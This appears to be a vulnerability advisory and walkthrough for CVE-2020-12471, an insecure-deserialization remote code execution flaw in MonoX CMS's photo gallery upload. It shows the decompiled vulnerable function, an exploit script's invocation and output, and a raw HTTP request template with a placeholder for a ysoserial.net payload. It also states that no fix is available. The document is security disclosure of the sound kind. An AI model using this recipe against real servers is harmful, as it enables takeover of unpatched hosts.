# Photogallery - Remote Code Execution via Insecure Deserialization

## VulDB-Like Summary

A vulnerability has been found in the MonoX CMS for .NET up to v5.1.40.5152. It has been rated as critical. Affected by this issue are the classes `MonoX.MonoSoftware.MonoX.HTML5Upload` and `MonoX.MonoSoftware.MonoX.SilverLightUploadModule`. The manipulation of the of the **ctl00$ctl00$ctl01$ctl00$cp$cp$wpm$gwpsnPhotoGallery$snPhotoGallery$photoUpload$ctlUpload$handlerResponse** parameter leads to Remote Code Execution vulnerability. Using CWE to declare the problem leads to CWE-502. Impacted is Integrity and Availability. An attacker might be able execute arbitrary code within the application context, and use them to achive remote code execution within the underlying hosting server.

The weakness was presented 04/19/2020 by Alessandro Magnosi (deadc0de) (GitHub Repository). The advisory is shared for download at github.com. This vulnerability is handled as CVE-2020-12471. The attack may be launched remotely. A single form of authentication is required for exploitation. Technical details are known and an exploit is publicly available.

## Proof-of-Concept

An exploit script is provided in this repository, which may be used to easily verify and exploit the vulnerability.

The script should give the following output, proving the vulnerability.

```
$ python3 exploit.py -t http://monox.local -u admin -p Passw0rd! -c calc -y path/to/ysoserial.exe
[*] Logging in
[*] Triggering RCE
[+] Success!
```

When the script finishes, a calculator should spawn in the target server.

## Walkthrough

This vulnerability was easily identified by code inspection. The affected function is the following:

```csharp
//#Kw Decompiled function name
private void #Kw(object sender, EventArgs e)
    {
        if (this.EnableFileGallery && ApplicationSettings.TrustLevel == AspNetHostingPermissionLevel.Unrestricted)
        {
            string[] array = this.handlerResponse.Value.Split(string.Format("{0},", "(SEPARATOR)"));
            foreach (string text in array)
            {
                string s = text.Replace("(SEPARATOR)", string.Empty);
                SnFileDTO snFileDTO = null;
                try
                {
                    snFileDTO = (SnFileDTO)BinarySerializer.Deserialize(Convert.FromBase64String(s));
                }
                catch
                {
                    snFileDTO = null;
                }
                if (snFileDTO != null)
                {
                    this.UploadedFileDTOs.Add(snFileDTO);
                }
            }
            this.handlerResponse.Value = string.Empty;
            this.UploadedFileDTOs = null;
            this.fileGallery.BindData();
        }
        this.OnFilesUploaded(this.EntityId, this.EntityType);
    }

```
This function got called after an image was uploaded in the gallery. Intercepting the traffic with Burp revealed the endpoint. The litmus test was finding a base64 encoded string followed by `(SEPARATOR)`. An example request is following:

<pre>
<code>
POST /MonoX/Pages/SocialNetworking/lng/en-US/PhotoGallery.aspx HTTP/1.1
Host: monox.local
User-Agent: Mozilla/5.0 Gecko/20100101 Firefox/71.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: {Stripped}
Content-Length: 5240

ctl00%24ctl00%24ctl01%24ctl00%24cp%24cp%24wpm%24gwpsnPhotoGallery%24snPhotoGall
ery%24photoUpload%24ctlUpload%24handlerResponse=<strong style="color: blue;">{base64-enc-payload}</strong><strong style="color: red;">(SEPARATOR)</strong>
&ctl00_ctl00_ctl01_ctl00_cp_cp_wpm_gwpsnPhotoGallery_snPhotoGallery_photoUpload
_ctlUpload_fileGallery_wndManager_ClientState=&ctl00_ctl00_ctl01_ctl00_editorSo
urceWindowManager_ClientState=&__VIEWSTATE_WAOKEY=&__VIEWSTATE=&__SCROLLPOSITIO
NX=0&__SCROLLPOSITIONY=0&__ASYNCPOST=true&ctl00%24ctl00%24ctl01%24ctl00%24cp%24
cp%24wpm%24gwpsnPhotoGallery%24snPhotoGallery%24photoUpload%24ctlUpload%24btnPo
stback=
</code>
</pre>

With these information, it was fairly easy to trigger an RCE via deserialization crafting a payload with **ysoserial.net**.

## Remediation

Currently, no fixes are available for this issue.

## References

*   [CWE-1236](https://cwe.mitre.org/data/definitions/1236.html)
*   [CWE-502](https://cwe.mitre.org/data/definitions/502.html)
*   [OWASP Top 10 - A8-Insecure Deserialization](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A8-Insecure_Deserialization)